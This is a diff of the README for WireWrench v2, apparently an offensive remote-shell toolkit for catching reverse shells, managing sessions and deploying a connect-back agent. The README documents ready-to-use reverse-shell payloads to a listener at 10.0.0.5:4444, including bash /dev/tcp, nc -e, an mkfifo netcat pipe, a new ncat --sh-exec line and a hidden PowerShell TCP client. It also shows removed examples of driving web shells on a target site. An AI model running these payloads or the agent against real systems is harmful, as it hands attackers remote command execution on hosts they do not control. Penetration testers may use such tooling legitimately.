@@ -2,7 +2,7 @@
 
 > **A remote shell toolkit** — catch reverse shells, manage sessions, deploy smart agents, transfer files.
 
-WireWrench v2 is a complete rework of the original web-shell REPL into a full client-server remote shell toolkit with a smart agent (`ww-target`) for reliable command execution and file transfer.
+WireWrench v2 is a complete rework of the original single-binary REPL into a full client-server remote shell toolkit with a smart agent (`ww-target`) for reliable command execution and file transfer.
 
 ## Architecture
 
@@ -13,10 +13,9 @@ WireWrench v2 is a complete rework of the original web-shell REPL into a full cl
 │  • list shells  │                    │                  │                  └─────────────┘
 │  • send cmd     │                    │  • TCP listener  │
 │  • interact     │                    │  • Smart agent   │     TCP :4446     ┌─────────────┐
-│  • script file  │                    │  • Web shells    │ ◄──────────────► │ ww-target   │
-│  • targ push    │                    │  • Session mgmt  │   framed protocol │ (smart agent)│
-│  • targ pull    │                    │  • File transfer │                  └─────────────┘
-│  • register web │                    │  • Unix socket   │
+│  • script file  │                    │  • Session mgmt  │ ◄──────────────► │ ww-target   │
+│  • targ push    │                    │  • File transfer │   framed protocol │ (smart agent)│
+│  • targ pull    │                    │  • Unix socket   │                  └─────────────┘
 └─────────────────┘                    └──────────────────┘
 ```
 
@@ -40,6 +39,14 @@ ww send 1 "whoami"
 # 5. Interactive mode (Ctrl+C to detach, shell stays alive)
 ww interact 1
 ```
+
+> **Note on dumb-shell stderr:** a dumb shell only relays bytes it actually
+> sends over the TCP socket.  Some payloads keep the shell's **stderr** on the
+> target's own terminal instead of forwarding it — for example
+> `ncat 127.0.0.1 4444 -e /bin/bash` prints `bash: ...: command not found` in
+> the *ncat* terminal, so `ww send` can never see it.  Use a payload that merges
+> stderr into the socket (the `bash -i &>/dev/tcp/... 0>&1` example above already
+> does this) or, with `ncat`, use `--sh-exec "/bin/bash 2>&1"`.
 
 ### Smart agent (ww-target)
 
@@ -135,22 +142,6 @@ ww targ upload -t 60 1 ./big-file.bin /tmp/big-file.bin
 ww targ cancel 1
 ```
 
-### Client — Web Shell Registration
-
-```bash
-# Basic GET-based web shell
-ww web https://target.com/shell.php?cmd=BLUB
-
-# POST with body injection
-ww web -X POST -d "cmd=BLUB" https://target.com/shell.php
-
-# Custom injection point
-ww web -i INJECT https://target.com/panel.php?exec=INJECT
-
-# With custom headers and cookies
-ww web -H "Authorization: Bearer xyz" -b "session=abc123" https://target.com/shell.php
-```
-
 ## Smart Agent (`ww-target`)
 
 `ww-target` is a lightweight Rust agent that connects back to `ww-server` on the **smart port** (default `:4446`) using a framed binary protocol.
@@ -194,6 +185,9 @@ target$ bash -c 'exec bash -i &>/dev/tcp/10.0.0.5/4444 0>&1'
 # Netcat (traditional)
 target$ nc -e /bin/sh 10.0.0.5 4444
 
+# Netcat with stderr forwarded (nmap ncat)
+target$ ncat 10.0.0.5 4444 --sh-exec "/bin/bash 2>&1"
+
 # Netcat (OpenBSD)
 target$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f
 
@@ -210,7 +204,6 @@ target> powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object System.Ne
 - **Deterministic command execution** — `ww-target` uses per-command `sh -c` with `wait_with_output()`, returning exact stdout, stderr, and exit code
 - **No stale output** — per-command sequence numbers in `FRAME_CMD`/`FRAME_CMD_RESULT` prevent output from bleeding between commands
 - **File transfers** — push/pull files with SHA-256 hash verification
-- **Web shell management** — register and interact with URL-injection-based web shells
 - **Interactive mode** — full raw terminal, line editing, word navigation, Ctrl+C detach
 - **Scripting** — run command lists from files with comment and empty-line support
 - **Session persistence** — shells stay alive when you detach from interactive mode
